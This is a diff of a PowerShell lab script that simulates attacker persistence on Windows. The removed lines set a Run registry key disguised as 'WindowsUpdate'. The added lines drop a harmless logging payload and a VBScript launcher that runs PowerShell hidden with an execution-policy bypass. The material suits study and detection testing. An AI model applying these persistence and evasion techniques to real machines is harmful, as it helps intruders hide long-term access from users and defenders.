@@ -1,2 +1,24 @@
-$regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "wscript.exe C:\ProgramData\launcher.vbs"
+# Create a benign "payload" for lab purposes — writes a timestamped log entry
+# This simulates what an attacker would drop as their persistent implant
+
+$payloadScript = @'
+$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+$logEntry = "$timestamp - NTUSER.MAN persistence fired on $env:COMPUTERNAME as $env:USERNAME"
+Add-Content -Path "C:\ProgramData\persistence_log.txt" -Value $logEntry
+'@
+
+# Save payload as a PS1 that launches via a wrapper EXE
+$payloadScript | Out-File -FilePath "C:\ProgramData\payload.ps1" -Encoding UTF8
+
+# Create a VBScript launcher (to avoid PowerShell window flash — realistic attacker behavior)
+$launcher = @'
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\payload.ps1", 0, False
+'@
+$launcher | Out-File -FilePath "C:\ProgramData\launcher.vbs" -Encoding ASCII
+
+Write-Host "[+] Payload files created:"
+Write-Host "    C:\ProgramData\payload.ps1  (actual payload)"
+Write-Host "    C:\ProgramData\launcher.vbs (silent launcher)"
+Write-Host ""
+Write-Host "[*] Run key will point to: wscript.exe C:\ProgramData\launcher.vbs"
